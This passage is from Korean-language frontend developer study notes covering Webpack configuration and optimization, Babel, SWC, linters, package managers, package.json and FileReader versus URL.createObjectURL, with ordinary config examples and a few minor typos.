- useEffect를 사용하여 api를 요청하고 응답에 따라 state를 업데이트 시킬 때 api 요청 후 서버에서 응답이 지연되는 경우 응답을 받기 전 해당 컴포넌트가 언마운트되면 api 호출 완료 후 state 업데이트 시도 시 메모리 누수가 발생한다. 즉 이전 컴포넌트에서 작업이 완료되기 전 컴포넌트가 언마운트 되는 경우 메모리 누수가 발생하는 것이다. 클린업 함수를 통해 컴포넌트가 언마운트 될 때 해당 작업을 종료하는 방식으로 문제를 해결할 수 있다. 또한 이미지 미리보기 구현 시 URL.createObjectURL을 통해 이미지 미리보기를 구현하였는데 해당 URL은 생성한 페이지에서만 유효하고 문서가 닫히거나 페이지를 이동하는 경우 유효하지 않기 때문에 메모리 누수가 발생한다. 이 때 URL.revokeObjectURL을 통해 생성한 객체 URL을 메모리에서 제거해주어야한다.

<br>

### # Webpack

- 웹팩

  최신 프론트엔드 프레임워크에서 가장 많이 사용되는 모듈 번들러이다. 모듈 번들러란 웹 애플리케이션을 구성하는 자원(HTML, CSS, Javscript, Images 등)을 모두 각각의 모듈로 보고 이를 압축하고 병합해서 하나의 번들 파일을 만드는 도구를 의미한다. 또한 모듈 번들러의 종류로는 웹팩 이 외에도 rollup, vite, esbuild 등이 있다. 모듈 시스템의 한계로 인해 등장하게 되었다.

- 웹팩 사용 이유

  웹 페이지를 구성하기 위해 HTTP 요청으로 html, css, js, 이미지, 웹 폰트, json 데이터 등 많은 파일을 받아오게 되는데 받아오는 파일이 많을수록 HTTP 요청이 많아지고 주로 사용하는 HTTP 1.1에서는 하나의 커넥션에서 하나의 요청(파이프라이닝 기술로 동시 최대 6개 요청)이 끝난 후 다음 요청을 보낼 수 있으므로 HTTP 요청이 많아지면 성능 저하가 발생할 수 있다. 이런 경우 웹팩을 통해 js, css, 이미지 등을 하나로 압축하여 번들 파일을 만들어 파일의 크기를 줄이고 HTTP 요청 횟수를 줄일 수 있다. 즉 웹팩을 사용하면 html, css, js 등의 모듈화와 코드 축소, 이미지 압축으로 인한 네트워크 비용 감소 및 요청 회수 감소 등에 장점이 있다.

  웹팩을 사용하지 않았을 경우 발생하는 문제에 대해 더 자세한 예시를 보자. 과거 ES6 모듈 시스템이 등장하기 전에는 a.js, b.js, c,js의 각 javasciprt 파일이 있다고 했을 때 이 javascript 파일들을 각 script 태그로 나누어 모듈처럼 사용하였다. 하지만 이러한 경우 전역을 공유하는 문제가 발생하였다.

  이러한 문제를 해결하기 위해 ES6 모듈 시스템이 등장하였다. ES6 모듈 시스템을 적용하는 경우 위와 같이 script 태그로 나뉘는 것이 아닌 하나의 script 태그 내부에서 a.js, b.js, c,js의 각 javasciprt 파일을 import문을 통해 가져오는 구조가 된다. 그렇게 되면 javascript 파일들은 각각의 모듈이 되는 것이다. 하지만 이 경우에도 문제가 발생한다. 해당 프로젝트의 구조 전체를 정적으로 배포한다고 했을 때 모듈로 나뉘어진 javascript 파일을 각각 요청해서 받아오게 된다. 이로 인해 네트워크 요청이 많아져 퍼포먼스가 떨어지는 문제가 발생하게 된다.

  그러면 여기서 생기는 의문이 하나의 javascript 파일에 모든 코드를 작성하면 되지 않느냐는 의문이 생길 수 있다. 이런 방식은 과거 ES6 모듈 시스템이 추가된 이유를 생각해보면 된다. 만약 하나의 javascript에 모든 javascript를 작성한다면 파일 크기가 매우 커지고 유지 보수가 어려워지며 코드 재사용 또한 어려워지는 문제가 발생할 수 있다.

  이와 같은 문제들로 인해 웹팩이나 vite 같은 번들러는 필수적으로 사용해야한다.

- 웹팩의 기본 옵션

  - Entry

    앱이 번들 처리를 시작할 지점. index.js부터 시작해서 import문을 따라서 빌드를 진행. 여러 개 지정해서 코드 스플리팅 할 수도 있음

  - Output

    - output.path

      빌드된 파일이 디스크에 저장될 물리 경로 (Node.js 기준)

    - output.filename

      빌드 결과물 파일 이름

    - output.publicPath

      브라우저가 정적 파일을 불러올 때 사용되는 base URL 경로 (HTML, JS 내 동적 로딩 등에서 사용), prefix와 같이 동작한다.

      ```js
      // publicPath: '/static/';
      <script src="/static/bundle.js"></script>
      ```

  - resolve

    resolve 옵션은 모듈을 import하거나 require할 때 Webpack이 해당 모듈의 위치를 어떻게 찾을지 결정하는 설정이다. 즉, 파일을 찾는 규칙, 확장자, 별칭(alias) 등을 지정해서 모듈 경로 해석을 커스터마이징할 수 있다.

    - resolve.extensions

      import 시 확장자를 생략할 수 있게 한다.

      ```js
      // webpack 설정
      resolve: {
        extensions: [".js", ".jsx"];
      }

      // 위 설정이 있는 경우
      import App from "./App"; // 실제는 ./App.js 또는 ./App.jsx
      ```

    - resolve.alias

      긴 경로를 짧고 의미 있는 이름으로 치환할 수 있게 한다.

      ```js
      // webpack 설정
      alias: {
        '@utils': path.resolve(__dirname, 'src/utils')
      }

      // 위 설정이 있는 경우
      import { formatDate } from '@utils/date';
      ```

    - resolve.modules

      Webpack이 모듈을 찾을 디렉토리 목록을 지정

      ```js
      // webpack 설정
      // 기본값은 ['node_modules']. 아래처럼 설정하면, import X from 'myLib' 시 src/ 폴더부터 먼저 찾는다.
      modules: ["src", "node_modules"];
      ```

    - resolve.mainFiles

      디렉토리를 import할 경우 찾을 기본 파일 이름을 지정

      ```js
      // webpack 설정
      // import Foo from './foo'일 때, 실제로는 ./foo/index.js 또는 ./foo/main.js가 된다.
      mainFiles: ["index", "main"];
      ```

  - loader

    기본적으로 Webpack은 Javascript(`.js`) 및 JSON(`.json`) 파일만 해석 가능하다. 하지만 loader를 사용하면 다른 포멧의 파일들(예: TypeScript, SCSS, 이미지 등)을 처리하고 JavaScript 모듈로 변환할 수 있다. 즉 그 외 파일들은 loader가 있어야 import 가능하다.

    ```js
    // 웹팩 설정 예시
    module: {
      rules: [
        {
          test: /\.tsx?$/, // .ts, .tsx 파일을
          use: "ts-loader", // ts-loader로 처리
          exclude: /node_modules/, // node_modules는 제외
        },
      ];
    }
    ```

    ```js
    // use 배열 예시 (체이닝), 아래처럼 순서는 오른쪽 → 왼쪽 (아래 → 위) 로 적용
    module: {
      rules: [
        {
          test: /\.scss$/,
          use: [
            "style-loader", // 3. 스타일을 <style> 태그로 삽입
            "css-loader", // 2. CSS 파일을 JS 모듈로 변환
            "sass-loader", // 1. SCSS → CSS 변환
          ],
        },
      ];
    }
    ```

    ```js
    // import 예시
    import "./main.scss"; // SCSS? 브라우저도 JS도 이해 못 함
    import img from "./logo.png"; // PNG도 마찬가지
    ```

    - rules.test

      어떤 파일에 로더를 적용할지 정규식으로 지정

    - rules.use

      어떤 로더를 사용할지 명시 (string 또는 배열 가능)

    - rules.import / exclude

      적용 대상 제외 또는 포함 경로

    - loader 종류

      1. CSS : style-loader + css-loader
      2. File : file-loader, raw-loader, url-loader, asset modules
      3. Typescript : ts-loader, babel-loader + @babel/preset-typescript
      4. Babel : babel-loader

  - plugin

    로더가 파일 단위로 처리한다면, plugin은 주로 빌드 전체 과정에 개입해서 번들된 결과물을 처리한다.

    ```js
    // index.html 파일을 기반으로 자동으로 <script src="bundle.js">를 삽입한 HTML 파일을 생성하는 코드
    const HtmlWebpackPlugin = require("html-webpack-plugin");

    module.exports = {
      plugins: [
        new HtmlWebpackPlugin({
          template: "./public/index.html",
        }),
      ],
    };
    ```

    - plugin 종류

      1. HtmlWebpackPlugin : HTML 파일 자동 생성 및 번들 삽입
      2. DefinePlugin : 전역 상수 정의 (예: process.env.NODE_ENV)
      3. MiniCssExtractPlugin : CSS를 별도 파일로 분리
      4. CleanWebpackPlugin : 빌드 전에 dist 폴더 정리
      5. BundleAnalyzerPlugin : 번들 사이즈 시각화
      6. CopyWebpackPlugin : 정적 파일 복사 (예: public/assets 등)

  - externals

    externals 옵션은 특정 모듈을 번들에서 제외하고 외부에서(예: CDN, 전역 변수 등) 참조하도록 설정하는 기능이다. 즉, Webpack이 그 모듈을 직접 번들에 포함하지 않도록 하여 번들 사이즈를 줄이고 로딩 속도를 높일 수 있게 한다. 예를 들어 우리 코드가 의존하고 있지만 빌드 과정에는 포함하지 않아도 되는 axios, jQuery 같은 써드파티 라이브러리를 이 externals에 명시하면 빌드 프로세스에 포함되지 않는다. 단, 제외된 모듈은 HTML에서 `<script>` 태그 등을 통해 직접 로딩해야 하며, 그렇지 않으면 런타임 오류가 발생한다.

    ```js
    // axios와 같은 써드파티 라이브러리는 패키지로 제공될때 이미 빌드 과정을 거쳤기 때문에 빌드 프로세스에서 제외하는 것이 좋다.
    // axios는 이미 node_modules에 위치해 있기 때문에 이를 웹팩 아웃풋 폴더에 옮기고 index.html에서 로딩해야한다.
    // 파일을 복사하는 CopyWebpackPlugin을 설치한다. 플러그인을 사용해서 라이브러리를 복사한다.
    const CopyPlugin = require("copy-webpack-plugin");

    module.exports = {
      plugins: [
        new CopyPlugin([
          {
            from: "./node_modules/axios/dist/axios.min.js",
            to: "./axios.min.js", // 목적지 파일에 들어간다
          },
        ]),
      ],
    };
    ```

    ```html
    <!-- index.html에서는 axios를 로딩하는 코드를 추가한다. -->
    <!-- src/index.html -->
    <html>
      <body>
        ...
        <script type="text/javascript" src="axios.min.js"></script>
      </body>
    </html>
    ```

  - performance

    번들 크기와 관련된 경고 메시지를 제어하는 설정이다. 이 설정은 실제 성능 최적화를 수행하지는 않지만, 큰 파일이 감지될 때 개발자에게 경고를 줘서 문제를 인식하게 해주는 용도이다.

    ```js
    performance: {
      hints: 'warning',            // 'warning' | 'error' | false
      maxEntrypointSize: 512000,   // entry point(예: main.js)의 최대 크기 (bytes), 512000 -> 약 500KB
      maxAssetSize: 244000,        // 개별 에셋의 최대 크기 (bytes)
    }
    ```

- 웹팩 최적화

  - 번들 사이즈를 줄여야 하는 이유

    1. 네트워크 비용 : 파일 용량이 클수록 네트워크 통신이 더 오래 걸린다.

    2. 파싱 및 컴파일 비용 : 브라우저에서 javascript 파일의 크기가 큰 경우 파싱 및 컴파일 하는데 시간이 오래 걸리고 하이드레이션이 지연되어 사용자 상호 작용이 지연될 수 있다.

    3. 메모리 비용 : 실행되지 않는 JS도 브라우저 메모리에 올라가 RAM을 차지하여 메모리를 낭비하게 된다.

  - 번들 사이즈 줄이기

    - webpack mode

      1. development

      강력한 소스 매핑, 로컬 호스트 서버에서는 라이브 리로딩이나 핫 모듈 리플레이스먼트 기능을 목적으로 이용한다.

      2. production

      기본 값이다. 로드 시간을 줄이기 위해 번들 최소화, 가벼운 소스맵 및 에셋 최적화에 초점을 맞춘다.

    - source map

      source map은 번들된 파일과 원본 소스 파일을 매핑해주는 파일이다. source map이 있으면, 브라우저 개발자 도구는 이걸 원래 코드로 되돌려 보여줄 수 있다. development mode에서는 eval, production mode에서는 source-map이 적절하다.

      1. eval : 빌드, 리빌드가 가장 빠름, 개발용. 소스 맵이 코드 안에 포함됨
      2. source-map : 완전한 맵 생성, 배포용 디버깅 가능
      3. cheap-module-source-map : 빠르면서 어느 정도 디버깅 가능
      4. hidden-source-map : 맵은 생성되지만 브라우저에선 안 보임 (오류 추적용)
      5. nosources-source-map : 맵은 있지만 원본 코드는 안 보임 (보안 목적)

      ```js
      module.exports = {
        devtool: "source-map", // 또는 'eval', 'cheap-module-source-map', 등
      };
      ```

    - code splitting

      하나의 번들을 여러 개의 청크로 나누는 기법을 말한다. 나누어진 청크는 필요한 상황에 로드하여 초기 로드 시간을 단축 시킬 수 있다.

      1. entry에 entry-point를 지정하여 나누는 기법

      entry point를 직접 지정하여 그것을 기준으로 번들을 나눌 수 있다. key는 번들 이름, value는 경로가 된다.

      ```js
      // webpack.config.js
      module.exports = {
        entry: {
          home: "./src/home.js",
          about: "./src/about.js",
        },
        output: {
          filename: "[name].bundle.js", // → 하나의 bundle.js가 home.bundle.js, about.bundle.js로 쪼개짐
          path: __dirname + "/dist",
        },
      };
      ```

      2. dynamic import

      dynamic import를 통해 불러오는 기법, preload 및 prefetch도 지원한다. preload는 곧바로 사용될 가능성이 높은 글꼴 등, prefetch는 추후에 사용될 가능성이 높은 모달 등에 사용할 수 있다.

      ```js
      // dynamic import
      if(true){
        import("./Modal.js").then(() => { ... })
      }

      // SPA에서 동적으로 컴포넌트를 불러오기 위해서는 Suspense와 lazy를 사용해야함.
      const Modal = React.lazy(() => import("./Modal"));

      // preload 및 prefetch
      import(/* webpackPrefetch: true */ "./MyComponent");
      import(/* webpackPreload: true */ "./MyComponent");
      ```

      3. optimization.splitChunks 사용

      splitChunks을 사용하면 vendor.bundle.js에 React 등 라이브러리를 별도 번들로 분리하여 중복 번들 생성을 방지할 수 있다.

      ```js
      module.exports = {
        optimization: {
          splitChunks: {
            chunks: "all", // 모든 종류의 import에 대해 분할 수행
          },
        },
      };
      ```

    - tree shaking

      사용하지 않는(dead) 코드를 최종 번들에서 제거하여 번들 사이즈를 최적화하는 기법이다. ES Modules (ESM, import / export)을 사용할 때 작동한다. Commonjs를 사용하는 경우에는 적용되지 않는다.

      sideEffects는 import하는 것만으로도 외부에 영향을 끼치는 코드임을 의미한다. (ex polyfill) 즉 sideEffects가 있는 경우 tree shaking이 불가하다. 그렇기 때문에 package.json에 모든 모듈이 sideEffects가 없음을 의미하는 false를 지정하거나 개별로 지정해야한다. 예시로 사용하는 라이브러리의 package.json을 확인해보면 대부분 sideEffects가 false인 것을 확인해볼 수 있다.

      추가로 utils.js와 같이 한 파일 안에 여러 개의 export를 만드는 경우 tree shaking이 제대로 적용되지 않을 수 있는데 해당 파일 내부에서 다른 곳에 사용될 수 있기 때문이다. 그렇기 때문에 하나의 파일에서는 하나의 export가 있는 것이 tree shaking에 좋다. -> 검증 필요

      ```js
      // tree shaking 예시
      // utils.js
      export function add(a, b) {
        return a + b;
      }

      export function subtract(a, b) {
        return a - b;
      }

      // main.js
      // 이 경우 subtract는 실제로 사용되지 않았으므로 Webpack은 최종 번들에서 사용되지 않은 export인 subtract를 자동으로 제거
      import { add } from "./utils";

      console.log(add(1, 2));
      ```

      ```js
      // sideEffects 예시
      // package.json
      {
        "sideEffects": ["*.css"]
      }
      ```

  - 빌드 속도 줄이기

    - persistent cache

      빌드 결과를 메모리 혹은 하드 디스크에 저장하여 리빌드 시 변화가 없다면 캐시된 빌드 결과물을 재활용하여 빌드 속도를 높인다. 기본 값은 memory 이다. 빌드 결과물 재사용 여부는 snapshot을 통해 결정한다.

      ```js
      module.exports = {
        cache: {
          type: "filesystem", // 디스크 (HDD/SSD 등 로컬 파일시스템)에 캐시를 저장
          buildDependencies: {
            // 캐시 무효화 기준: webpack 설정 파일이 바뀌면 캐시 무효화
            config: [__filename],
          },
        },
      };
      ```

    - snapshot

      파일 시스템의 상태를 추적해서 재빌드 여부를 결정하는 캐시 메커니즘의 일부이다. 이 파일이 바뀌었는지 확인하는 기준 정보(스냅샷)를 저장해두고 다음 빌드 시 비교해서 바뀌었으면 캐시를 무효화하여 다시 빌드하고 안 바뀌었으면 캐시를 그대로 사용하는 것이다. 즉 캐시 사용 여부의 기준이 되는 것이다. 캐시 옵션을 켜고 빌드를 하면 `node_modules/.cahce`에 pack 파일이 생성되는데 pack 파일에 붙어있는 정보가 snapshot이다.

      snapshot에는 timestamp와 hash 등에 정보가 있는데 timestamp의 경우 마지막 수정 시간, hash의 경우 파일 content를 hashing 알고리즘을 통해 생성한 string이다. 이 두 가지를 통해 캐시 무효화 여부를 결정할 수 있다. timestamp의 경우 빌드 시 파일의 메타데이터에서 timestamp를 가져와 snapshot의 timestamp와 비교하여 바뀌었다면 캐시를 무효화한다. 다만 속도는 빠르지만 변경없이 저장만 해도 timestamp가 변경되기 때문에 안정성은 떨어진다. 반면 hash의 경우 속도는 상대적으로 느리지만 안정성이 높다. webpack 설정 내부에 boolean 값을 통해 timestamp, hash 중 어떠한 값을 기준으로 캐시 무효화 여부를 결정할지 지정할 수 있다.

      추천하는 설정은 다음과 같다.

      1. 로컬 개발환경에서는 module, buildDependencies, resolve 모두 timestamp true로 하는 것이 좋다. 다만 프로젝트가 큰 경우에는 buildDependencies에 hash true도 추가한다.

      2. CI 빌드시에는 git에서 clone 해오기 때문에 모든 timestamp가 바뀌므로 module, buildDependencies, resolve 모두 hash true로 해주는 것이 좋다.

      3. CI 빌드를 하는데 업데이트만 일어나는 경우, 즉 git pull만 하는 경우에는 module, buildDependencies, resolve 모두 timestamp true, hash true 모두 설정하는 것이 좋다.

      ```js
      module.exports = {
        cache: {
          type: "filesystem",
          buildDependencies: {
            config: [__filename],
          },
        },
        snapshot: {
          module: {
            timestamp: true, // 모듈의 수정 시간 기준으로 캐시 관리
          },
          resolve: {
            timestamp: true, // resolve 경로의 수정 시간 기준으로 캐시 관리
          },
          buildDependencies: {
            config: [__filename, path.resolve(__dirname, "tsconfig.json")], // Webpack 설정이나 빌드 관련 파일이 변경되었을 때 캐시 무효화
          },
          resolveDependencies: {
            timestamp: true, // resolve 경로의 의존성 파일 수정 시간 기준으로 캐시 관리
          },
          managedPaths: [/node_modules/], // node_modules에 이름이 바뀌거나, 버전이 업데이트되는 경우에만 캐시를 무효화
          immutablePaths: [path.resolve(__dirname, "public/assets")],
        },
      };
      ```

<br>

### # Babel

- 바벨

  바벨은 ES6+ 버전 이상의 자바스크립트나 JSX, 타입스크립트 코드를 하위 버전의 자바스크립트 코드로 변환 시켜주는 자바스크립트 트랜스파일러이다. 크로스 브라우징 이슈를 해결하기 위해 사용한다. 즉 최신 JavaScript 문법을 구형 브라우저에서도 동작하게 하기 위해서이다. 브라우저 버전마다 JS 엔진에 버전도 다르다. 그렇기 때문에 브라우저마다 지원하는 JS 문법이 다르다. 또한 React를 예시로 React에서 사용하는 JSX 문법은 브라우저가 이해하지 못한다. 그렇기 떄문에 트랜스파일링을 통해 React.createElement()와 같은 형태로 변환하고 이는 브라우저가 해석할 수 있다. import를 통해 가져온 React 라이브러리의 객체인 React 객체의 메소드가 createElement이고 이 형태는 obj.method()와 같다. 바벨의 빌드 단계는 파싱(바벨 코어가 수행) -> 변환(플러그인이 수행) -> 출력(바벨 코어가 수행) 단계로 이루어지며 Webpack과 같은 정적 모듈 번들러와 함께 사용할 수 있다. (@babel/core, babel-loader, 프리셋 (@babel/preset-env, @babel/preset-react, @babel/preset-typescript 등) 등의 설치)

  ```js
  module.exports = {
    module: {
      rules: [
        {
          test: /\.js$/,
          exclude: /node_modules/,
          use: {
            loader: "babel-loader",
            options: {
              presets: ["@babel/preset-env"], // 👈 필수
            },
          },
        },
      ],
    },
  };
  ```

- 플러그인

  바벨에 파싱, 변환, 출력 빌드 단계 중 변환 단계를 담당하며 어떤 코드를 어떻게 변환할지에 대한 규칙을 정의한다.

- 프리셋

  목적에 맞게 여러 가지 플러그인을 세트로 모아놓은 것이다. 대표 프리셋은 아래와 같다.

  | 프리셋 이름                    | 설명                                                             | 사용 예시               |
  | ------------------------------ | ---------------------------------------------------------------- | ----------------------- |
  | **`@babel/preset-env`**        | 최신 JavaScript 문법(ES6+)을 구형 브라우저에서도 동작하도록 변환 | 일반 JS 프로젝트        |
  | **`@babel/preset-react`**      | JSX 문법을 JavaScript로 변환                                     | React 프로젝트          |
  | **`@babel/preset-typescript`** | TypeScript를 JavaScript로 변환                                   | TypeScript + Babel 조합 |
  | **`@babel/preset-flow`**       | Flow 타입을 제거하고 JS로 변환                                   | Flow 타입 사용 시       |

- 폴리필

  바벨은 ES6 이후 버전을 ES5 버전으로 변환할 수 있는 코드만 변환한다. 만약 최신 기능을 사용하였는데 이 기능이 ES5 버전에는 존재하지 않아 빌드가 누락 된 부분을 폴리필을 통해 변환할 수 있다. 코어제이에스(corejs), 폴리필아이오(polyfill.io) 등이 대표적인 폴리필 패키지이다.

<br>

### # SWC(Speedy Web Compiler)

- SWC(Speedy Web Compiler)란?

  SWC는 컴파일과 번들링 모두를 수행하는 자바스크립트 빌드 툴이다. nextjs에서는 next 12버전부터 바벨 대신 기본 트랜스파일러로 사용되고 있다. 트랜스파일링을 수행했던 바벨과, 코드 경량화를 수행했던 터서(Terser)를 SWC가 대체했다. 싱글 스레드인 자바스크립트로 작성 된 바벨과 테서와는 다르게 SWC는 러스트(Rust)로 작성되어 병렬 처리가 가능하기 때문에 훨씬 빠르다.

- 빌드 시간 측정

  특정 커맨드의 결과가 나오기까지의 시간을 체크해주는 패키지를 사용하여 측정할 수 있다. (ex gnomon)

<br>

### # prettier, eslint, stylelint

- eslint

  자바스크립트 언어와 소스코드를 분석하는 도구로 코드에 특정 스타일과 규칙을 적용해 에러를 찾고 패턴을 적용시킬 수 있는 분석 툴이다. 코드 구현 방식을 지정하여 에러를 사전에 방지하고 코드 퀄리티를 보장하도록 도와준다. 또한 prettier와 같이 코드 스타일과 관련 된 코드 포멧팅도 지원한다. 예를 들면 변수 사용 규칙, 콘솔 사용 방지, 사용되지 않는 객채 등에 경고나 에러를 선택하여 띄워줄 수 있다.

  ```js
  // .eslintrc.json
  {
    "rules": {
      "no-unused-vars": "warn",    // 사용하지 않는 변수 경고
      "no-console": "error"        // console 사용 금지
      "no-var": "warn" // var 사용 시 경고
    }
  }
  ```

- prettier

  prettier는 코드 스타일을 통일되도록 도와주는 코드 포멧터이다. eslint와 같이 코드 구현 방식이 아닌, 줄 바꿈, 공백, 들여 쓰기 등 에디터에서 '텍스트'를 일관되게 작성되도록 도와준다.

  ```json
  // .prettierrc
  {
    "semi": true,
    "singleQuote": true,
    "tabWidth": 2
  }
  ```

  ```js
  // Before
  function hello() {
    console.log("hi");
  }

  // After Prettier
  function hello() {
    console.log("hi");
  }
  ```

- stylelint

  css및 scss를 코드를 분석하는 도구이다. 공백, 따옴표, 들여쓰기와 같이 작성 규칙이나 스타일 순서 등 css의 코드 스타일 규칙을 지정할 수 있다.

  ```json
  // .stylelintrc.json
  {
    "rules": {
      "color-hex-case": "lower", // 16진수 색상 소문자 사용
      "string-quotes": "double", // 문자열은 더블 쿼트 사용
      "indentation": 2 // 들여쓰기 2칸
    }
  }
  ```

<br>

### # 사용자 경험 개선 방법

1. 로딩, 에러, 잘못된 경로 시 대체 페이지 제공

   페이지 로딩 중일 때 로딩 스피너 노출, 에러나 잘못된 경로 시 대체 페이지 제공 등을 통한 사용자 경험향상

2. 스켈레톤 UI 사용

   컨텐츠 로딩 지연 시 사용자의 지루함을 막아주기 위해 로딩 바 혹은 스피너 대신 스켈레톤 UI(대체 UI)를 사용할 수 있다.

3. 비디오 사용 시 대체 이미지

   동영상 사용 시 동영상이 보이지 않는 유저들을 위해 대체 이미지를 깔아준다.

4. 드래그 앤 드롭 기능 시 텍스트 드래그 막기

   드래그 앤 드롭 기능 구현 시 타겟 css에 `use-select: none` 속성을 주어 텍스트가 드래그되는 것을 막을 수 있다.

5. 이미지 태그의 onError 속성

   api로 이미지를 불러와 띄워줄 경우 이미지를 불러오지 못하는 경우(이미지 주소가 N/A로 오는 경우)가 발생할 수 있는데 이 때 이미지 태그의 onError를 사용하여 대체 이미지를 사용하여 에러 처리를 할 수 있다.

6. 쿼리 스트링 활용

   검색 기능 구현 시 쿼리 스트링을 활용하면 사용자가 검색 결과를 다른 사용자들과 공유할 수 있다.

7. 연관 검색어 기능 구현 시 디바운싱 적용

   연관 검색어 기능 구현 시 디바운싱을 적용하여 검색하는 과정 중 원하지 않는 결과물을 노출하지 않도록 함

<br>

### # 패키지 매니저

- npm

  - nodejs의 표준 패키지 매니저로 별도 설치 필요없음

  - 과거 직렬 설치 방식이었으나 현재는 병렬 설치도 지원

  - 과거 보안 이슈가 있었으나 꾸준히 개선 중

- yarn

  - 병렬적 설치로 속도 개선

  - 패키지 캐시 및 재사용 지원

  - 예전엔 npm보다 속도 및 안정성에서 우위였으나 최신 npm 버전과 큰 차이 없음

- yarn berry (Yarn 2 이상의 버전)

  - yarn의 두 번째 버전

  - Plug n Play 방식(node_modules 폴더를 만들지 않고 zip 형태로 패키지를 관리, pnp.cjs 파일에 의존성 매핑 정보를 기록)으로 npm과 yarn에서 발생하는 유령 의존성 문제 해결

  - 패키지 클론 시 install 하지 않아도 되는 제로 인스톨이 가능하기 때문에 CI 단계에서 의존성 설치 시간을 단축시킬 수 있음

- pnpm

  - 글로벌 저장소(캐시)에서 패키지를 관리하여 디스크 공간 절약

  - node_modules를 특이한 방식으로 관리 (hard link) → 중첩 설치 최소화

  - package.json에 명시된 패키지만 글로벌 저장소에서 가져와 설치해 유령 의존성 문제 해결

  - 모노레포 설정이 간단하고 Yarn Berry보다 빠르고 직관적이라는 평가가 많음

- 유령 의존성 : 사용 중인 패키지에 의존성 패키지, 즉 개발자가 직접 사용하고 있지 않은 패키지를 말한다. 이러한 패키지들은 직접 설치하지 않아도 해당 패키지를 사용할 수 있게 된다. 이런 유령 의존성의 문제는 버전 관리가 어렵기 때문에 버전 호환 에러가 발생할 수 있다.

<br>

### # package.json

- package.json의 역할

  - 프로젝트 이름, 버전, 설명 등의 정보 제공

  - 의존성 패키지 관리 (dependencies, devDependencies)

  - npm 스크립트 정의 (scripts)

  - 프로젝트에서 사용하는 모듈 버전 정의 및 관리

- dependencies, devDependencies의 차이

  개발용, 배포용 라이브러리를 구분하여 설치하기 위해 사용한다.

  | 항목         | `dependencies`                         | `devDependencies`                                  |
  | ------------ | -------------------------------------- | -------------------------------------------------- |
  | 📦 포함 여부 | 배포 시 포함됨                         | 배포 시 **제외 가능** (`npm install --production`) |
  | 🧠 용도      | 앱 **실행에 필요한** 라이브러리        | 앱 **개발/빌드/테스트에 필요한** 도구              |
  | 🛠️ 설치 명령 | `npm install <패키지명>`               | `npm install -D <패키지명>`                        |
  | 예시         | `react`, `axios`, `express`, `zustand` | `typescript`, `eslint`, `jest`, `webpack`, `vite`  |

- package-lock.json

  | 항목             | `package.json`                                                    | `package-lock.json`                                                                                                               |
  | ---------------- | ----------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
  | 🎯 목적          | 프로젝트 정보와 의존성 명세                                       | 의존성 **버전 고정** (정확한 트리 기록)                                                                                           |
  | 📦 포함 내용     | 어떤 패키지를 쓰는지, **대략적인 버전 범위** (version range 사용) | 어떤 패키지가 설치됐는지, **정확한 버전** (의존성 트리 전체, 각 패키지의 정확한 버전, 다운로드 URL, 무결성 해시 등의 정보가 포함) |
  | 🔁 업데이트 시점 | 직접 수정하거나 `npm install`로 의존성 추가 시                    | `npm install`로 패키지를 설치/제거할 때 자동 생성 또는 업데이트                                                                   |
  | 👥 협업 시 의미  | "이런 패키지들을 쓸 거야"                                         | "정확히 이 버전들이 설치돼야 해"                                                                                                  |

  설치된 의존성의 정확한 버전과 트리를 기록한 파일로 npm install 시 자동으로 생성 및 갱신되며, 협업과 배포에서 동일한 환경을 보장한다. Git 저장소에 꼭 커밋해서 팀원들이 동일한 패키지 버전을 설치하게 해야 한다.

<br>

### # FileReader와 URL.createObjectURL

이미지 미리보기와 같이 파일 입출력 관련 기능을 구현할 때 사용하는 대표적인 메소드로는 FileReader와 URL.createObjectURL 방식이 있다.

- Blob 객체와 File 객체

  - Blob 객체(바이너리 라지 오브젝트) : 이미지, 오디오, 영상 등을 다룰 때 사용하는 멀티미디어 객체이다. 사이즈나 타입 등의 정보를 담고 있다.

  - File 객체 : Blob을 상속받는 객체로 최종수정날짜(라스트모디파이드), 파일명(네임) 등의 조금 더 많은 정보를 담고 있다.

- FileReader

  - File 객체, Blob 객체 저장된 바이너리 데이터를 비동기적으로 읽어 base64 인코딩된 문자열(data URL) 또는 텍스트 등으로 변환

  - 변환된 base64 문자열을 `<img src="data:...">` 등에 바로 사용할 수 있음

- URL.createObjectURL

  - File 객체, Blob 객체를 받아서 임시로 접근 가능한 고유한 URL을 바로 생성(별도의 인코딩 과정 없이, 브라우저 메모리에 포인터만 생성하는 방식), 해당 URL은 생성된 페이지 내에서만 유효하다.

  - 페이지를 닫거나 이동할 때 반드시 URL.revokeObjectURL()을 호출해야한다. 호출하지 않으면 생성한 고유 URL은 메모리에 계속 상주하게 되어 메모리 누수가 발생할 수 있다.

- FileReader vs URL.createObjectURL

  | 항목          | FileReader                        | URL.createObjectURL                  |
  | ------------- | --------------------------------- | ------------------------------------ |
  | 결과물        | base64 인코딩된 문자열 (data URL) | 임시 고유 URL                        |
  | 메모리 사용량 | 상대적으로 높음                   | 상대적으로 낮음                      |
  | 속도          | 느림 (파일 읽고 인코딩 필요)      | 빠름 (즉시 URL 생성)                 |
  | 용량 한계     | 10MB 정도 권장                    | 800MB 이상도 가능                    |
  | 사용 후 처리  | 불필요                            | 필요, `URL.revokeObjectURL()`로 해제 |

<br>

### # import 중괄호 {}의 유무

- export 방식에서 차이가 있다. export로 내보낸 경우 이름을 그대로 활용하여 {} 중괄호로 감싸 가져와야하고 export default로 내보낸 경우 이름을 변경하여 괄호 없이 가져올 수 있다. 이 때 중괄호가 있는 경우도 as 키워드를 이용하면 이름을 바꿔 받아올 수 있다. {a as b}의 경우 a의 값을 b에 할당하여 가져온다라고 해석할 수 있다.

  ```javascript
  // App.js
  const a = 1;
  const b = 2;
  export { a };
  export const c = 3;
  export default b;
  ```

  ```javascript
  // Sub.js
  import d, { a, c as e } from "./Example";
  console.log(a, d, e); // 1, 2, 3
  ```

<br>

### # JavaScript Module, ESM(ECMAScript Modules)과 CJS(CommonJS)

- 모듈 시스템이 생겨난 이유

  모듈 시스템이 생기기 전 Javascript는 기본적으로 script 태그로 불려져 사용했었다. 하지만 하나의 javascript 파일에 작성되는 경우 가독성 및 유지보수성이 매우 떨어지고,
  javascript 파일을 분리하여 script 태그로 불려진 여러 javascript는 서로 관계가 없음에도 전역 객체 간에 의존성(전역 변수 공유)을 가지거나 스크립트 파일 로드 순서를
  수동으로 지정해야하는 등 여러 문제가 발생했다. 그래서 생겨난 것이 모듈 시스템이다. 모듈 시스템의 대표적인 포맷(문법)으로는 ESM(ECMAScript Modules)과 CJS(CommonJS)가 있다.

- ESM(ECMAScript Modules)과 CJS(CommonJS) 차이

